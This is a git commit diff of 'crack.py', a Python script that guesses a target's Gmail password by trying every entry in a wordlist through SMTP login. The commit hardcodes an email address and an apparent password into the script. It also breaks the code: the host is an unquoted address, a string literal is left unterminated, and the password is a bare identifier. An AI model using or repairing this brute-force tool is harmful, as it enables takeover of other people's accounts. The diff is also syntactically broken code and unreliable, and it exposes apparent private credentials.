c9fad9dc90cd992c36549fb8ca02cba890eb70a4
shoron11 <75226264+shoron11@users.noreply.github.com>
2020-11-30 04:51:31 +0600

    Update crack.py

--- crack.py
+++ crack.py
@@ -2,17 +2,17 @@ import smtplib
 
 
 def main():
-    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpserver = smtplib.SMTP(miashapon590@gmail.com, 587)
     smtpserver.ehlo()
     smtpserver.starttls()
 \
-    user = raw_input("Alpha : Enter the target's email address: ")
+    user = raw_input("Alpha : Enter the target's email address: miashapon590@gmail.com)
     passwfile = raw_input("Alpha : Enter the password file name: ")
     passwfile = open(passwfile, "r")
 
     for password in passwfile:
         try:
-            smtpserver.login(user, password)
+            smtpserver.login(user, jubayer0131)
             print("Alpha : [+] Password Found: %s" % password)
             break
         except smtplib.SMTPAuthenticationError:
